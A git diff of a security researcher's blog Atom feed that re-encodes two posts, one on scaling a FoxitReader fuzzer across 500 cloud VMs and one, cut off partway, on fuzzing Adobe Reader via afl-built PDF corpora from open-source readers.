@@ -1,411 +1,411 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="https://kciredor.com/feed.xml" rel="self" type="application/atom+xml" /><link href="https://kciredor.com/" rel="alternate" type="text/html" /><updated>2019-05-03T16:53:17+02:00</updated><id>https://kciredor.com/feed.xml</id><title type="html">kciredor’s information security blog</title><subtitle>Security researcher. Software engineer. Independent. This blog features my write-up's on interesting research and security findings. Make sure you follow me on Twitter @kciredor_ to stay up to date on new posts!
-</subtitle><author><name>Roderick Schaefer</name></author><entry><title type="html">Throwing 500 vm’s at your fuzzing target being an individual security researcher</title><link href="https://kciredor.com/throwing-500-vms-fuzzing-target-individual-security-researcher.html" rel="alternate" type="text/html" title="Throwing 500 vm's at your fuzzing target being an individual security researcher" /><published>2019-05-03T10:00:00+02:00</published><updated>2019-05-03T10:00:00+02:00</updated><id>https://kciredor.com/throwing-500-vms-fuzzing-target-individual-security-researcher</id><content type="html" xml:base="https://kciredor.com/throwing-500-vms-fuzzing-target-individual-security-researcher.html">&lt;h1 id=&quot;adobe-reader-progress&quot;&gt;Adobe Reader progress&lt;/h1&gt;
-&lt;p&gt;One year ago I blogged about my many attempts and failures at &lt;a href=&quot;/fuzzing-adobe-reader-for-exploitable-vulns-fun-not-profit.html&quot;&gt;fuzzing Adobe Reader&lt;/a&gt; and finding exploitable security issues.&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.2">Jekyll</generator><link href="https://kciredor.com/feed.xml" rel="self" type="application/atom+xml" /><link href="https://kciredor.com/" rel="alternate" type="text/html" /><updated>2022-04-26T10:26:20+02:00</updated><id>https://kciredor.com/feed.xml</id><title type="html">kciredor’s information security blog</title><subtitle>Security researcher. Software engineer. Independent. This blog features my write-up's on interesting research and security findings. Make sure you follow me on Twitter @kciredor_ to stay up to date on new posts!
+</subtitle><author><name>Roderick Schaefer</name></author><entry><title type="html">Throwing 500 vm’s at your fuzzing target being an individual security researcher</title><link href="https://kciredor.com/throwing-500-vms-fuzzing-target-individual-security-researcher.html" rel="alternate" type="text/html" title="Throwing 500 vm’s at your fuzzing target being an individual security researcher" /><published>2019-05-03T10:00:00+02:00</published><updated>2019-05-03T10:00:00+02:00</updated><id>https://kciredor.com/throwing-500-vms-fuzzing-target-individual-security-researcher</id><content type="html" xml:base="https://kciredor.com/throwing-500-vms-fuzzing-target-individual-security-researcher.html"><![CDATA[<h1 id="adobe-reader-progress">Adobe Reader progress</h1>
+<p>One year ago I blogged about my many attempts and failures at <a href="/fuzzing-adobe-reader-for-exploitable-vulns-fun-not-profit.html">fuzzing Adobe Reader</a> and finding exploitable security issues.</p>
 
-&lt;p&gt;Meanwhile, I realized that writing your own fuzzers is the way to go as confirmed by my first &lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-19713&quot;&gt;CVE-2018-19713&lt;/a&gt; for Adobe Reader. Found the bug using ‘What The Fuzz’ targeting a custom plugin I coded which integrates with Adobe Reader.&lt;/p&gt;
+<p>Meanwhile, I realized that writing your own fuzzers is the way to go as confirmed by my first <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-19713">CVE-2018-19713</a> for Adobe Reader. Found the bug using ‘What The Fuzz’ targeting a custom plugin I coded which integrates with Adobe Reader.</p>
 
-&lt;p&gt;So what’s the next step?&lt;/p&gt;
+<p>So what’s the next step?</p>
 
-&lt;h1 id=&quot;fuzzing-foxitreader&quot;&gt;Fuzzing FoxitReader&lt;/h1&gt;
-&lt;p&gt;Excellent research has been shared on exploiting FoxitReader by @steventseeley, which inspired me to switch from Adobe to Foxit as a target.&lt;/p&gt;
+<h1 id="fuzzing-foxitreader">Fuzzing FoxitReader</h1>
+<p>Excellent research has been shared on exploiting FoxitReader by @steventseeley, which inspired me to switch from Adobe to Foxit as a target.</p>
 
-&lt;p&gt;Having learned from Adobe Reader I immediately tried to find a way to fuzz FoxitReader using What The Fuzz. There are many routes to fuzzing FoxitReader and it’s out of the scope of this blog post to go in depth.&lt;/p&gt;
+<p>Having learned from Adobe Reader I immediately tried to find a way to fuzz FoxitReader using What The Fuzz. There are many routes to fuzzing FoxitReader and it’s out of the scope of this blog post to go in depth.</p>
 
-&lt;p&gt;To summarize: my fuzzer generates inputs and replaces them in target process memory, resetting FoxitReader’s instruction pointer to evaluate new inputs over and over. No inputs ever touch the harddisk, meaning it’s pretty fast!&lt;/p&gt;
+<p>To summarize: my fuzzer generates inputs and replaces them in target process memory, resetting FoxitReader’s instruction pointer to evaluate new inputs over and over. No inputs ever touch the harddisk, meaning it’s pretty fast!</p>
 
-&lt;h1 id=&quot;the-importance-of-scaling-up&quot;&gt;The importance of scaling up&lt;/h1&gt;
-&lt;p&gt;So far so good, now let’s do some calculations to get an understanding of the importance of scaling up your fuzzing efforts.&lt;/p&gt;
+<h1 id="the-importance-of-scaling-up">The importance of scaling up</h1>
+<p>So far so good, now let’s do some calculations to get an understanding of the importance of scaling up your fuzzing efforts.</p>
 
-&lt;p&gt;According to a presentation given by @ifsecure, testing browsers you should try about 100.000.000 different inputs. Let’s make this our target number. Given my ability to fuzz at about 1.5 inputs per second per vm this would take about 771 days running 1 vm. This makes no sense: within that long period of time, FoxitReader has been updated multiple times and bugs have been fixed. Even worse: it will take way too long to find out if your fuzzing strategy actually works or needs improvement. Even with 10 vm’s, which is still manually manageable, it will take months.&lt;/p&gt;
+<p>According to a presentation given by @ifsecure, testing browsers you should try about 100.000.000 different inputs. Let’s make this our target number. Given my ability to fuzz at about 1.5 inputs per second per vm this would take about 771 days running 1 vm. This makes no sense: within that long period of time, FoxitReader has been updated multiple times and bugs have been fixed. Even worse: it will take way too long to find out if your fuzzing strategy actually works or needs improvement. Even with 10 vm’s, which is still manually manageable, it will take months.</p>
 
-&lt;p&gt;Sure, fuzzing 1.5 inputs per second is generally considered to be slow. Let’s take into account that my input files are quite large on purpose, so parsing takes time. Furthermore, I’m targeting FoxitReader as a whole, not a small dll or harness, which is also the reason I can only run 1 fuzzer per vm instead of simply using multiple cores. FoxitReader can’t run multiple instances in parallel.&lt;/p&gt;
+<p>Sure, fuzzing 1.5 inputs per second is generally considered to be slow. Let’s take into account that my input files are quite large on purpose, so parsing takes time. Furthermore, I’m targeting FoxitReader as a whole, not a small dll or harness, which is also the reason I can only run 1 fuzzer per vm instead of simply using multiple cores. FoxitReader can’t run multiple instances in parallel.</p>
 
-&lt;p&gt;What if we could use 500 vm’s instead of 1 or 10? We’ll end up needing only 2 days!&lt;/p&gt;
+<p>What if we could use 500 vm’s instead of 1 or 10? We’ll end up needing only 2 days!</p>
 
-&lt;p&gt;This makes for a solid case of scaling up. But where to find enough power without spending too much money? How to orchestrate a massive amount of vm’s?&lt;/p&gt;
+<p>This makes for a solid case of scaling up. But where to find enough power without spending too much money? How to orchestrate a massive amount of vm’s?</p>
 
-&lt;h1 id=&quot;how-to-scale-up&quot;&gt;How to scale up&lt;/h1&gt;
-&lt;p&gt;Keep in mind some of the bigger tech companies may have in house fuzzing at scale ‘as a service’, but what if you are on your own?&lt;/p&gt;
+<h1 id="how-to-scale-up">How to scale up</h1>
+<p>Keep in mind some of the bigger tech companies may have in house fuzzing at scale ‘as a service’, but what if you are on your own?</p>
 
-&lt;p&gt;Here’s a list of things we need to accomplish:&lt;/p&gt;
-&lt;ul&gt;
-  &lt;li&gt;Fuzzing your target (e.g. FoxitReader)&lt;/li&gt;
-  &lt;li&gt;Running on Windows 8&lt;/li&gt;
-  &lt;li&gt;At scale&lt;/li&gt;
-  &lt;li&gt;Keeping costs low&lt;/li&gt;
-  &lt;li&gt;Collecting crashes&lt;/li&gt;
-&lt;/ul&gt;
+<p>Here’s a list of things we need to accomplish:</p>
+<ul>
+  <li>Fuzzing your target (e.g. FoxitReader)</li>
+  <li>Running on Windows 8</li>
+  <li>At scale</li>
+  <li>Keeping costs low</li>
+  <li>Collecting crashes</li>
+</ul>
 
-&lt;p&gt;Quickly you’ll realize you need a cloud provider with enough power. Yet running 500 instances with Google, Amazon or Azure will certainly become an expensive experience. Let alone not all of them will allow you to bring your own Windows version/license. It’s advisable not to settle for a ready-made Windows Server image: FoxitReader is the target, not the exploit mitigations Windows may have added. Currently, I’d stick to Windows 8.&lt;/p&gt;
+<p>Quickly you’ll realize you need a cloud provider with enough power. Yet running 500 instances with Google, Amazon or Azure will certainly become an expensive experience. Let alone not all of them will allow you to bring your own Windows version/license. It’s advisable not to settle for a ready-made Windows Server image: FoxitReader is the target, not the exploit mitigations Windows may have added. Currently, I’d stick to Windows 8.</p>
 
-&lt;h2 id=&quot;keeping-costs-low&quot;&gt;Keeping costs low&lt;/h2&gt;
-&lt;p&gt;Let’s look at the problem of the costs. Think in terms of spare capacity. Most cloud providers will not be selling 100% of their capacity to their customers all the time. Many cloud providers offer their spare capacity at reduced costs, but of course, there’s always a catch. For instance: you may buy a spare vm at 20% of the normal costs, but within 24 hours maximum, it will be removed from your account because it was sold for the regular price to another customer.&lt;/p&gt;
+<h2 id="keeping-costs-low">Keeping costs low</h2>
+<p>Let’s look at the problem of the costs. Think in terms of spare capacity. Most cloud providers will not be selling 100% of their capacity to their customers all the time. Many cloud providers offer their spare capacity at reduced costs, but of course, there’s always a catch. For instance: you may buy a spare vm at 20% of the normal costs, but within 24 hours maximum, it will be removed from your account because it was sold for the regular price to another customer.</p>
 
-&lt;h2 id=&quot;collecting-crashes&quot;&gt;Collecting crashes&lt;/h2&gt;
-&lt;p&gt;Now you might be thinking ‘what happens to my crashes when I suddenly lose my running vm’s and fuzzers?’. Good question ;-) How about creating some external storage like an S3 bucket and having your fuzzer push every crash it finds to the bucket? While you’re at it, using something like pushbullet you can make your fuzzer send you a push notification to your phone every time you find a crash!&lt;/p&gt;
+<h2 id="collecting-crashes">Collecting crashes</h2>
+<p>Now you might be thinking ‘what happens to my crashes when I suddenly lose my running vm’s and fuzzers?’. Good question ;-) How about creating some external storage like an S3 bucket and having your fuzzer push every crash it finds to the bucket? While you’re at it, using something like pushbullet you can make your fuzzer send you a push notification to your phone every time you find a crash!</p>
 
-&lt;h2 id=&quot;at-scale&quot;&gt;At scale&lt;/h2&gt;
-&lt;p&gt;But you keep on losing vm’s during fuzzing because of the usage of spare capacity, right? In comes the autoscaling feature of your cloud provider! Autoscaling groups allow you to define a minimum/maximum set of instances running a certain image and instance type. Setting the minimum and maximum amount to the same number and ensuring we use spare capacity and our own image, it doesn’t matter if the cloud provider decides to remove one or multiple vm’s all the time: new ones will automatically be launched to stay in shape with the min/max we defined. This process may take some time (vm’s need to be allocated and booted), so we just add this overhead to our calculations targeting the number of inputs we want to fuzz.&lt;/p&gt;
+<h2 id="at-scale">At scale</h2>
+<p>But you keep on losing vm’s during fuzzing because of the usage of spare capacity, right? In comes the autoscaling feature of your cloud provider! Autoscaling groups allow you to define a minimum/maximum set of instances running a certain image and instance type. Setting the minimum and maximum amount to the same number and ensuring we use spare capacity and our own image, it doesn’t matter if the cloud provider decides to remove one or multiple vm’s all the time: new ones will automatically be launched to stay in shape with the min/max we defined. This process may take some time (vm’s need to be allocated and booted), so we just add this overhead to our calculations targeting the number of inputs we want to fuzz.</p>
 
-&lt;h2 id=&quot;running-on-windows-8&quot;&gt;Running on Windows 8&lt;/h2&gt;
-&lt;p&gt;Time to think about running your own Windows version next. You may not be able to create an image to launch new vm’s with Windows 8, but we sure are able to create images from a Linux vm offered by the cloud provider. What if you could split a multi-core Linux vm into multiple nested single core Windows 8 vm’s? In comes Proxmox! Proxmox allows you to manage resource allocation using a web interface and installing vm’s using any .iso you prefer, including Windows. As long as your cloud provider offers instances that allow for nested VT-X, the performance penalty of nesting will be minimal.&lt;/p&gt;
+<h2 id="running-on-windows-8">Running on Windows 8</h2>
+<p>Time to think about running your own Windows version next. You may not be able to create an image to launch new vm’s with Windows 8, but we sure are able to create images from a Linux vm offered by the cloud provider. What if you could split a multi-core Linux vm into multiple nested single core Windows 8 vm’s? In comes Proxmox! Proxmox allows you to manage resource allocation using a web interface and installing vm’s using any .iso you prefer, including Windows. As long as your cloud provider offers instances that allow for nested VT-X, the performance penalty of nesting will be minimal.</p>
 
-&lt;h2 id=&quot;step-by-step&quot;&gt;Step by step&lt;/h2&gt;
-&lt;p&gt;If you do not fully understand the pieces of the puzzle, please award yourself some time to learn more about engineering and then try this again. Start by getting yourself a cloud account and playing with things, building things, breaking things and fixing them.&lt;/p&gt;
+<h2 id="step-by-step">Step by step</h2>
+<p>If you do not fully understand the pieces of the puzzle, please award yourself some time to learn more about engineering and then try this again. Start by getting yourself a cloud account and playing with things, building things, breaking things and fixing them.</p>
 
-&lt;p&gt;So let’s put two and two together:&lt;/p&gt;
-&lt;ul&gt;
-  &lt;li&gt;Find yourself a cloud provider offering the usage of nested vm’s (VT-X) and spare capacity usage&lt;/li&gt;
-  &lt;li&gt;Calculate the sweet spot of instances x cores in terms of costs, for me 50 vm’s with 10 cores each was the cheapest. This works out to 24gb ram (10 * 2 + slack) and 50gb SSD each.&lt;/li&gt;
-  &lt;li&gt;Install Proxmox on a Linux instance and install Windows in a nested vm on a single core.&lt;/li&gt;
-  &lt;li&gt;Code the pushing of crashing inputs to external storage like S3 into your fuzzer of choice.&lt;/li&gt;
-  &lt;li&gt;Install both your fuzzer and target application.&lt;/li&gt;
-  &lt;li&gt;Set your fuzzer to run automatically at Windows startup.&lt;/li&gt;
-  &lt;li&gt;Convert the Windows vm into a ‘template’. Now create linked clones until you have as many Windows vm’s as you have cores available on this instance. Linked clones save space and the performance penalty is minimal.&lt;/li&gt;
-  &lt;li&gt;Toggle all of the vm’s to run automatically at Proxmox boot.&lt;/li&gt;
-  &lt;li&gt;Create an image of your fully ready Proxmox instance.&lt;/li&gt;
-  &lt;li&gt;Create an autoscaling group using your image and instance type of choice, using spare capacity, setting the minimum and maximum number of instances to 2. Always ensure everything works exactly as expected before scaling up.&lt;/li&gt;
-  &lt;li&gt;Everything good? Then let’s go and up the min/max to 50, effectively resulting in 500 Windows vm’s fuzzing FoxitReader in parallel!&lt;/li&gt;
-  &lt;li&gt;You may hit limits set by your cloud provider, like the maximum number of cores you may use at once. Respectfully requesting a limit increase truthfully explaining your intentions worked out for me.&lt;/li&gt;
-&lt;/ul&gt;
+<p>So let’s put two and two together:</p>
+<ul>
+  <li>Find yourself a cloud provider offering the usage of nested vm’s (VT-X) and spare capacity usage</li>
+  <li>Calculate the sweet spot of instances x cores in terms of costs, for me 50 vm’s with 10 cores each was the cheapest. This works out to 24gb ram (10 * 2 + slack) and 50gb SSD each.</li>
+  <li>Install Proxmox on a Linux instance and install Windows in a nested vm on a single core.</li>
+  <li>Code the pushing of crashing inputs to external storage like S3 into your fuzzer of choice.</li>
+  <li>Install both your fuzzer and target application.</li>
+  <li>Set your fuzzer to run automatically at Windows startup.</li>
+  <li>Convert the Windows vm into a ‘template’. Now create linked clones until you have as many Windows vm’s as you have cores available on this instance. Linked clones save space and the performance penalty is minimal.</li>
+  <li>Toggle all of the vm’s to run automatically at Proxmox boot.</li>
+  <li>Create an image of your fully ready Proxmox instance.</li>
+  <li>Create an autoscaling group using your image and instance type of choice, using spare capacity, setting the minimum and maximum number of instances to 2. Always ensure everything works exactly as expected before scaling up.</li>
+  <li>Everything good? Then let’s go and up the min/max to 50, effectively resulting in 500 Windows vm’s fuzzing FoxitReader in parallel!</li>
+  <li>You may hit limits set by your cloud provider, like the maximum number of cores you may use at once. Respectfully requesting a limit increase truthfully explaining your intentions worked out for me.</li>
+</ul>
 
-&lt;p&gt;&lt;img src=&quot;/assets/post_500-scaling.png&quot; alt=&quot;Fuzzing with 500 vm's&quot; title=&quot;&quot; /&gt;&lt;/p&gt;
+<p><img src="/assets/post_500-scaling.png" alt="Fuzzing with 500 vm's" title="" /></p>
 
-&lt;p&gt;Ending up with 48 hours of fuzzing hitting the 100.000.000 inputs mark, I was charged about $250,-.&lt;/p&gt;
+<p>Ending up with 48 hours of fuzzing hitting the 100.000.000 inputs mark, I was charged about $250,-.</p>
 
-&lt;h1 id=&quot;room-for-improvement&quot;&gt;Room for improvement&lt;/h1&gt;
-&lt;p&gt;It would be nice if the fuzzer could update itself upon vm launch by downloading and extracting ‘latest.zip’. This way you can update your fuzzer, settings, grammar, etc. without having to create a new vm image saving you time between iterations.&lt;/p&gt;
+<h1 id="room-for-improvement">Room for improvement</h1>
+<p>It would be nice if the fuzzer could update itself upon vm launch by downloading and extracting ‘latest.zip’. This way you can update your fuzzer, settings, grammar, etc. without having to create a new vm image saving you time between iterations.</p>
 
-&lt;h1 id=&quot;last-words&quot;&gt;Last words&lt;/h1&gt;
-&lt;p&gt;On a day to day basis, I experience the advantage of knowing how to code and automate things, supporting my security research. It works out both ways: security awareness actively improves your quality of work as a developer / engineer. Having experience with all of dev/sec/ops gives you many new opportunities to step up your game.&lt;/p&gt;
+<h1 id="last-words">Last words</h1>
+<p>On a day to day basis, I experience the advantage of knowing how to code and automate things, supporting my security research. It works out both ways: security awareness actively improves your quality of work as a developer / engineer. Having experience with all of dev/sec/ops gives you many new opportunities to step up your game.</p>
 
-&lt;p&gt;Don’t forget to document and git version your work. After a couple of months you need to be able to pick up where you left, certain things will not make sense anymore by that time.&lt;/p&gt;
+<p>Don’t forget to document and git version your work. After a couple of months you need to be able to pick up where you left, certain things will not make sense anymore by that time.</p>
 
-&lt;p&gt;Thanks @rnotcln for inspiring me to think about properly scaling fuzzing jobs. Thanks @steventseeley for sharing high-quality posts on FoxitReader and proofreading this blog post. Thanks @ifsecure for the magic inputs number and open sourced tooling.&lt;/p&gt;
+<p>Thanks @rnotcln for inspiring me to think about properly scaling fuzzing jobs. Thanks @steventseeley for sharing high-quality posts on FoxitReader and proofreading this blog post. Thanks @ifsecure for the magic inputs number and open sourced tooling.</p>
 
-&lt;p&gt;Let’s keep on hacking!&lt;/p&gt;
+<p>Let’s keep on hacking!</p>
 
-&lt;p&gt;Cheers,
-kciredor&lt;/p&gt;</content><author><name>Roderick Schaefer</name></author><summary type="html">Adobe Reader progress One year ago I blogged about my many attempts and failures at fuzzing Adobe Reader and finding exploitable security issues.</summary></entry><entry><title type="html">Fuzzing Adobe Reader for exploitable vulns (fun != profit)</title><link href="https://kciredor.com/fuzzing-adobe-reader-for-exploitable-vulns-fun-not-profit.html" rel="alternate" type="text/html" title="Fuzzing Adobe Reader for exploitable vulns (fun != profit)" /><published>2018-04-25T18:00:00+02:00</published><updated>2018-04-25T18:00:00+02:00</updated><id>https://kciredor.com/fuzzing-adobe-reader-for-exploitable-vulns-fun-not-profit</id><content type="html" xml:base="https://kciredor.com/fuzzing-adobe-reader-for-exploitable-vulns-fun-not-profit.html">&lt;h1 id=&quot;binaries-vs-websites&quot;&gt;Binaries vs websites&lt;/h1&gt;
-&lt;p&gt;It has been half a year since my last blog post covering an &lt;a href=&quot;/taking-over-every-ad-on-olx-automated-an-idor-story.html&quot;&gt;IDOR in a website API&lt;/a&gt;. About time to write about something new and hopefully interesting! Having switched my focus from websites to binaries a new world opened up to me.&lt;/p&gt;
+<p>Cheers,
+kciredor</p>]]></content><author><name>Roderick Schaefer</name></author><category term="exploits" /><category term="fuzzing" /><category term="pdf" /><category term="bugbounty" /><category term="infosec" /><summary type="html"><![CDATA[Adobe Reader progress One year ago I blogged about my many attempts and failures at fuzzing Adobe Reader and finding exploitable security issues.]]></summary></entry><entry><title type="html">Fuzzing Adobe Reader for exploitable vulns (fun != profit)</title><link href="https://kciredor.com/fuzzing-adobe-reader-for-exploitable-vulns-fun-not-profit.html" rel="alternate" type="text/html" title="Fuzzing Adobe Reader for exploitable vulns (fun != profit)" /><published>2018-04-25T18:00:00+02:00</published><updated>2018-04-25T18:00:00+02:00</updated><id>https://kciredor.com/fuzzing-adobe-reader-for-exploitable-vulns-fun-not-profit</id><content type="html" xml:base="https://kciredor.com/fuzzing-adobe-reader-for-exploitable-vulns-fun-not-profit.html"><![CDATA[<h1 id="binaries-vs-websites">Binaries vs websites</h1>
+<p>It has been half a year since my last blog post covering an <a href="/taking-over-every-ad-on-olx-automated-an-idor-story.html">IDOR in a website API</a>. About time to write about something new and hopefully interesting! Having switched my focus from websites to binaries a new world opened up to me.</p>
 
-&lt;p&gt;The reason I switched is my passion for low-level engineering. Reading through disassemblies, walking along with code being executed in a debugger, memory corruption, etc. Reverse engineering has always been a passion of mine and binary exploitation seems to get pretty close. I got completely hooked during @corelanc0d3r’s Exploit Development Bootcamp, after which I treated myself to the Advanced class as well.&lt;/p&gt;
+<p>The reason I switched is my passion for low-level engineering. Reading through disassemblies, walking along with code being executed in a debugger, memory corruption, etc. Reverse engineering has always been a passion of mine and binary exploitation seems to get pretty close. I got completely hooked during @corelanc0d3r’s Exploit Development Bootcamp, after which I treated myself to the Advanced class as well.</p>
 
-&lt;h1 id=&quot;adobe-reader&quot;&gt;Adobe Reader&lt;/h1&gt;
-&lt;p&gt;Step one is finding your first target. The reason I chose Adobe Reader is primarily that it’s a well-known application, offering reasonable bounties for example through submission to the ZDI. Also, my assumption was that it would be easier to find bugs in a PDF reader than in a browser like Chrome. I would say, to my knowledge, that Adobe Reader, Office and the well-known internet browsers are the top 5 well known and hardest application targets to find exploitable vulnerabilities in. Which makes them interesting.&lt;/p&gt;
+<h1 id="adobe-reader">Adobe Reader</h1>
+<p>Step one is finding your first target. The reason I chose Adobe Reader is primarily that it’s a well-known application, offering reasonable bounties for example through submission to the ZDI. Also, my assumption was that it would be easier to find bugs in a PDF reader than in a browser like Chrome. I would say, to my knowledge, that Adobe Reader, Office and the well-known internet browsers are the top 5 well known and hardest application targets to find exploitable vulnerabilities in. Which makes them interesting.</p>
 
-&lt;h1 id=&quot;before-exploitation-comes-fuzzing&quot;&gt;Before exploitation comes fuzzing&lt;/h1&gt;
-&lt;p&gt;Wow did I underestimate this one! I told myself it would take quite some time to build a reliable exploit once I found a bug in Adobe Reader. There are so many mitigations to work through once you have an exploitable crash. Amongst others: Data Execution Protection (DEP: prevents your code from being executed), Address Space Layout Randomization (ASLR: where in memory is my code anyway?), Sandboxing (you need to escape this one, it limits what your code can do). It’s hard to end up with reliable code execution.&lt;/p&gt;
+<h1 id="before-exploitation-comes-fuzzing">Before exploitation comes fuzzing</h1>
+<p>Wow did I underestimate this one! I told myself it would take quite some time to build a reliable exploit once I found a bug in Adobe Reader. There are so many mitigations to work through once you have an exploitable crash. Amongst others: Data Execution Protection (DEP: prevents your code from being executed), Address Space Layout Randomization (ASLR: where in memory is my code anyway?), Sandboxing (you need to escape this one, it limits what your code can do). It’s hard to end up with reliable code execution.</p>
 
-&lt;p&gt;But before you can start building an exploit you need to trigger a bug or multiple bugs. Perhaps one to leak a DLL address to bypass ASLR and another one which overwrites an exception handler address and triggers a crash. So how do you find these bugs? The answer is fuzzing. And in case of a hard target like Adobe Reader, this can take forever.&lt;/p&gt;
+<p>But before you can start building an exploit you need to trigger a bug or multiple bugs. Perhaps one to leak a DLL address to bypass ASLR and another one which overwrites an exception handler address and triggers a crash. So how do you find these bugs? The answer is fuzzing. And in case of a hard target like Adobe Reader, this can take forever.</p>
 
-&lt;p&gt;Well, for me it did. Or at least months.&lt;/p&gt;
+<p>Well, for me it did. Or at least months.</p>
 
-&lt;p&gt;Diving into fuzzing you’ll find out it’s a world on its own. There are many concepts and tools. Endless possibilities to try and force crashes on targets. The basic idea is generating as many inputs (e.g. input files) as you can and running them as fast as you can against your target. If you are lucky, one or more inputs will crash the target.&lt;/p&gt;
+<p>Diving into fuzzing you’ll find out it’s a world on its own. There are many concepts and tools. Endless possibilities to try and force crashes on targets. The basic idea is generating as many inputs (e.g. input files) as you can and running them as fast as you can against your target. If you are lucky, one or more inputs will crash the target.</p>
 
-&lt;p&gt;With harder targets besides luck, you’ll need better ideas than throwing around random inputs.&lt;/p&gt;
+<p>With harder targets besides luck, you’ll need better ideas than throwing around random inputs.</p>
 
-&lt;h1 id=&quot;many-ways-to-rome&quot;&gt;Many ways to Rome&lt;/h1&gt;
-&lt;p&gt;Fuzzing a complex target like Adobe Reader requires you to get to know the target really well. Open up some of the executables / DLL’s in a disassembler and see what you can make up of the symbols (if any) and references. Perhaps you’ll find out Adobe Reader uses libtiff, which learns us that might be a way in. Give this recon process plenty of time.&lt;/p&gt;
+<h1 id="many-ways-to-rome">Many ways to Rome</h1>
+<p>Fuzzing a complex target like Adobe Reader requires you to get to know the target really well. Open up some of the executables / DLL’s in a disassembler and see what you can make up of the symbols (if any) and references. Perhaps you’ll find out Adobe Reader uses libtiff, which learns us that might be a way in. Give this recon process plenty of time.</p>
 
-&lt;p&gt;Now let’s see how we can attack our target.&lt;/p&gt;
+<p>Now let’s see how we can attack our target.</p>
 
-&lt;h2 id=&quot;generating-corpus-on-open-source-pdf-readers&quot;&gt;Generating corpus on open source PDF readers&lt;/h2&gt;
-&lt;p&gt;Researcher @yrp604 explained to me it’s hard to get coverage on a target like Adobe Reader, mostly because it’s slow and hard to orchestrate. His suggestion was to create a large enough PDF corpus on open source PDF readers and throw that corpus at Adobe Reader. And so I did.&lt;/p&gt;
+<h2 id="generating-corpus-on-open-source-pdf-readers">Generating corpus on open source PDF readers</h2>
+<p>Researcher @yrp604 explained to me it’s hard to get coverage on a target like Adobe Reader, mostly because it’s slow and hard to orchestrate. His suggestion was to create a large enough PDF corpus on open source PDF readers and throw that corpus at Adobe Reader. And so I did.</p>
 
-&lt;p&gt;Amongst the most popular fuzzers is American Fuzzy Lop (afl-fuzz) by @lcamtuf. Instead of just continuously throwing random input files at a target, afl actually learns what the input file format looks like by covering the code paths (edges to be exact) of the target application. Also, it leverages Linux forking to run hundreds or even thousands of executions of your target per second per processor core.&lt;/p&gt;
+<p>Amongst the most popular fuzzers is American Fuzzy Lop (afl-fuzz) by @lcamtuf. Instead of just continuously throwing random input files at a target, afl actually learns what the input file format looks like by covering the code paths (edges to be exact) of the target application. Also, it leverages Linux forking to run hundreds or even thousands of executions of your target per second per processor core.</p>
 
-&lt;p&gt;In order to fuzz open source readers on Linux you should get yourself a couple of vm’s with a distro you like. Install afl on it and download the open source reader tarball. Now unpack it into /dev/shm, which is shared memory. We try to compile everything statically and run everything from memory, in order to gain more executions per second. Also, you’ll need to compile the open source reader using one of afl’s compilers. Furthermore we should patch out any output file writes for more speed.&lt;/p&gt;
+<p>In order to fuzz open source readers on Linux you should get yourself a couple of vm’s with a distro you like. Install afl on it and download the open source reader tarball. Now unpack it into /dev/shm, which is shared memory. We try to compile everything statically and run everything from memory, in order to gain more executions per second. Also, you’ll need to compile the open source reader using one of afl’s compilers. Furthermore we should patch out any output file writes for more speed.</p>
 
-&lt;p&gt;I have set up fuzzing for 3 different targets in parallel: xpdf, mupdf and ghostscript. Let me share with you an example on xpdf.&lt;/p&gt;
+<p>I have set up fuzzing for 3 different targets in parallel: xpdf, mupdf and ghostscript. Let me share with you an example on xpdf.</p>
 
-&lt;ul&gt;
-  &lt;li&gt;Unpack xpdf v4.x sourcecode into /dev/shm so we are working in RAM.&lt;/li&gt;
-  &lt;li&gt;Your target needs to accept an input file and should fully parse the input PDF. I picked pdftoppm.c.&lt;/li&gt;
-  &lt;li&gt;Edit pdftoppm.c and patch out the output file write. I simply placed a continue inside the for loop right before the writes starting with the line: if (!strcmp(ppmRoot, “-“)).&lt;/li&gt;
-  &lt;li&gt;Compile xpdf using afl’s gcc or clang, for me clang ended up running xpdf faster. Harden it and use Address Sanitizer to find more interesting inputs:&lt;/li&gt;
-&lt;/ul&gt;
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;mkdir &lt;/span&gt;build &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;build &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;CC&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;afl-clang-fast &lt;span class=&quot;nv&quot;&gt;CXX&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;afl-clang-fast++ cmake &lt;span class=&quot;nt&quot;&gt;-DCMAKE_BUILD_TYPE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Release .. &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;USE_ASAN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1 &lt;span class=&quot;nv&quot;&gt;AFL_HARDEN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1 make&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+<ul>
+  <li>Unpack xpdf v4.x sourcecode into /dev/shm so we are working in RAM.</li>
+  <li>Your target needs to accept an input file and should fully parse the input PDF. I picked pdftoppm.c.</li>
+  <li>Edit pdftoppm.c and patch out the output file write. I simply placed a continue inside the for loop right before the writes starting with the line: if (!strcmp(ppmRoot, “-“)).</li>
+  <li>Compile xpdf using afl’s gcc or clang, for me clang ended up running xpdf faster. Harden it and use Address Sanitizer to find more interesting inputs:</li>
+</ul>
